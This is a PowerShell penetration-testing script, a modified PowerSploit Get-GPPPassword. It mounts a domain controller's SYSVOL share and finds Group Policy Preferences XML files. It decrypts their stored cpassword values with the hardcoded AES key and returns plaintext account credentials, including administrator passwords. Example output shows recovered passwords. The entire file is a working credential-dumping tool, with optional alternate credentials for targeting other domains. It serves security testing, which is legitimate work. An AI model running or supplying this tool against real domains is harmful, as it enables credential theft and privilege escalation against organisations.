function Get-GPPPasswordMod
{
<#
.SYNOPSIS

    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    Shabby Mods: Scott Sutherland (@_nullbind)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 2.4.2
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
    
    Modification Summary
     - Added verbose statusing.
     - Added option to allow users to provide alternative credentials for authenticating to domain controllers not associated with the current user/domain.
     - Modified some of the parsing logic to output one credential at a time.
     - Added an excessive amount of comments to remind myself how PowerShell works :)

.EXAMPLE

    Below is the standard command usage as a domain user.

    PS C:\> Get-GPPPassword
    
    NewName   : 
    Changed   : 2015-05-05 16:49:19
    UserName  : test
    CPassword : wWHIrHyXsbFpBhpQ/fMKbwEEg3Ko0Es+RskCj/W6F8I
    Password  : password
    File      : \\192.168.1.1\sysvol\demo.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\DataSources\DataSources.xml

    NewName   : 
    Changed   : 2015-05-05 16:46:28
    UserName  : myuser
    CPassword : OvKsuaNQPUAnLU4z8wzxe8Q1teovDkwdcJfI+rZb+eM
    Password  : mypassword
    File      : \\192.168.1.1\sysvol\demo.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\Drives\Drives.xml

    NewName   : 
    Changed   : 2015-05-07 00:55:10
    UserName  : supershareuser
    CPassword : 3uDWVlCID77BN5/bo5T5YLqZWIrj8yNKngzGhpuHO44
    Password  : superpass
    File      : \\192.168.1.1\sysvol\demo.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\Drives\Drives.xml

    NewName   : NotTheAdminUser
    Changed   : 2015-05-08 01:16:36
    UserName  : Administrator
    CPassword : zkS7m3XryG3Mwr/HOHT59n8D4YqouI/idF01L9gjpjw
    Password  : ********11
    File      : \\192.168.1.1\sysvol\demo.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\Groups\Groups.xml

    NewName   : TestAdmin
    Changed   : 2015-05-08 00:58:49
    UserName  : MyAdministrator
    CPassword : AzVJmXh/J9KrU5n0czX1uAjyl43GRDc33Gnizx/zYpE
    Password  : testpass
    File      : \\192.168.1.1\sysvol\demo.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\Groups\Groups.xml

    NewName   : 
    Changed   : 2015-05-05 16:51:01
    UserName  : administrator
    CPassword : upTiWyCZN6O+ljt30DpKoO11LltmtQzgY29yzKRyjtY
    Password  : SuperPassword!
    File      : \\192.168.1.1\sysvol\demo.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\ScheduledTasks\ScheduledTasks.xml

.EXAMPLE

    In the example below the verbose switch is used to show additional status information and return a list of passwords.  Also, the exmaple 
    shows how to target a remote domain controller using alternative domain credentials from a system not associated with the domain of the 
    domain controller.

    PS C:\> Get-GPPPasswordMod -Verbose -DomainController 10.2.9.109 -Credential test.domain\administrator | Select-Object Password
    VERBOSE:  Creating temp drive bgzimwykdt mapped to \\10.2.9.109\sysvol...
    VERBOSE:  Gathering GPP xml files from \\10.2.9.109\sysvol...
    VERBOSE:  Paring content from GPP xml files...
    VERBOSE:  DataSources.xml found, processing...
    VERBOSE:  Drives.xml found, processing...
    VERBOSE:  Groups.xml found, processing...
    VERBOSE:  Printers.xml found, processing...
    VERBOSE:  ScheduledTasks.xml found, processing...
    VERBOSE:  Removing temp drive bgzimwykdt...

    Password                                                                                                                                             
    --------                                                                                                                                             
    password
    mypassword
    superpass
    ********11
    testpass
    SuperPassword!

.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html

#>
    [CmdletBinding(DefaultParametersetName="Default")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )

    Begin
    {

        # Ensure that machine is domain joined and script is running as a domain account, or a credential has been provided
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
            return
        }

        # ----------------------------------------------------------------
        # Define helper function that decodes and decrypts password
        # ----------------------------------------------------------------
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )

            try {
                #Append appropriate padding based on string length  
                $Mod = ($Cpassword.length % 4)
            
                switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
                }

                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
                #Create a new AES .NET Crypto Object
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
                #Set IV to all nulls to prevent dynamic generation of IV value
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
        
            catch {Write-Error $Error[0]}
        }  

        # ----------------------------------------------------------------
        # Setup data table to store GPP Information
        # ----------------------------------------------------------------
        $TableGPPPasswords = New-Object System.Data.DataTable         
        $TableGPPPasswords.Columns.Add('NewName') | Out-Null
        $TableGPPPasswords.Columns.Add('Changed') | Out-Null
        $TableGPPPasswords.Columns.Add('UserName') | Out-Null        
        $TableGPPPasswords.Columns.Add('CPassword') | Out-Null
        $TableGPPPasswords.Columns.Add('Password') | Out-Null        
        $TableGPPPasswords.Columns.Add('File') | Out-Null           

        # ----------------------------------------------------------------
        # Authenticate to DC, mount sysvol share, & dump xml file contents
        # ----------------------------------------------------------------
 
        # Set target DC
        if($DomainController){
            $TargetDC = "\\$DomainController"
        }else{
            $TargetDC = $env:LOGONSERVER
        }

        # Create randomish name for dynamic mount point 
        $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName = [String]::Join("",$result)        
        $DrivePath = "$TargetDC\sysvol"

        # Map a temp drive to the DC sysvol share
        Write-Verbose "Creating temp drive $DriveName mapped to $DrivePath..."
        If ($Credential.UserName){
        
            # Mount the drive
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential| Out-Null                        
        }else{
            
            # Create a temp drive mapping
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null                   
        }        
    }

    Process
    {
        # Verify temp drive mounted
        $DriveCheck = Get-PSDrive | Where { $_.name -like "$DriveName"}
        if($DriveCheck) {
            Write-Verbose "$Drivename created."
        }else{
            Write-Verbose "Failed to mount $DriveName to $DrivePath."
            return
        }

        # ----------------------------------------------------------------
        # Find, download, parse, decrypt, and display results
        # ----------------------------------------------------------------
        
        # Setup temp drive name
        $DriveLetter = $DriveName+":"

        # Get a list of GGP config files
        Write-Verbose "Gathering GPP xml files from $DrivePath..."
        $XMlFiles = Get-ChildItem -Path $DriveLetter -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'          

        # Parse GPP config files
        Write-Verbose "Paring content from GPP xml files..."
        $XMlFiles | 
        ForEach-Object {
            $FileFullName = $_.fullname
            $FileName = $_.Name
            [xml]$FileContent = Get-Content -Path "$FileFullName"
            
            # Process Drives.xml
            if($FileName -eq "Drives.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $FileContent.Drives.Drive | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            # Process Groups.xml
            if($FileName -eq "Groups.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.Groups.User | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = $_.properties.newname        
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            # Process Services.xml
            if($FileName -eq "Services.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.NTServices.NTService | 
                ForEach-Object {
                    [string]$Username = $_.properties.accountname
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            # Process ScheduledTasks.xml
            if($FileName -eq "ScheduledTasks.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.ScheduledTasks.Task | 
                ForEach-Object {
                    [string]$Username = $_.properties.runas
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            # Process DataSources.xml
            if($FileName -eq "DataSources.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.DataSources.DataSource | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            # Process Printers.xml
            if($FileName -eq "Printers.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.Printers.SharedPrinter | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }
            
        }

        # Remove the temp drive mapping
        Write-Verbose "Removing temp drive $DriveName..."
        Remove-PSDrive $DriveName
        
        # Check if anything was found
        if ( -not $XMlFiles ) {
            throw 'No preference files found.'
            return
        }

        # Display results
        $TableGPPPasswords 
    }
}
